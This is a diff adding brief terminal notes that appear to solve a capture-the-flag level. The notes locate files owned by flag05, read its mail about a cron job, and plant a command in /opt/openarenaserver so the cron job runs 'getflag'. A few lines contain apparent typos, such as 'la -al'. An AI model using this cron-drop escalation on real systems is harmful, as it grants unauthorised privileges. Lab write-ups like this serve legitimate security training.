@@ -1,0 +1,12 @@
+> la -al
+
+> find / -user flag05 2>/dev/null
+you have a new mail***
+
+> cat /var/mail/flag05
+see the cron script execute every 2 min
+> cat /usr/sbin/openarenaserver
+> echo "getflag > /tmp/05/" > /opt/openarenaserver/getflag
+> watch cat /tmp/05
+
+> su level06
